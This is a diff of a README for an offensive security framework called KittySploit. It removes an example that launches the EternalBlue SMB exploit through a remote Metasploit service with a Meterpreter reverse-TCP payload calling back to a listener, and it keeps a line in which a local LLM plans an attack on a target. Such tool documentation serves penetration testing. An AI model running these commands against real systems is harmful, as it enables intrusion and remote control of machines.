@@ -105,15 +105,6 @@ Let the framework plan your attack using a local LLM:
 kittysploit agent target.com --llm-local --llm-model llama3.1:8b
 ```
 
-## Example: Remote Metasploit Integration
-
-Use the built-in plugin to connect KittySploit to a remote Metasploit RPC service and launch Metasploit modules from the framework:
-
-```bash
-plugin run metasploit connect --host 192.168.1.50 --port 55553 --user msf --pass secret
-plugin run metasploit search smb
-plugin run metasploit execute exploit/windows/smb/ms17_010_eternalblue --payload payload/windows/x64/meterpreter/reverse_tcp --set RHOSTS=10.10.10.12 --set LHOST=10.10.10.5 --set LPORT=4444
-```
 
 More examples are available in [USAGE.md](USAGE.md).
 
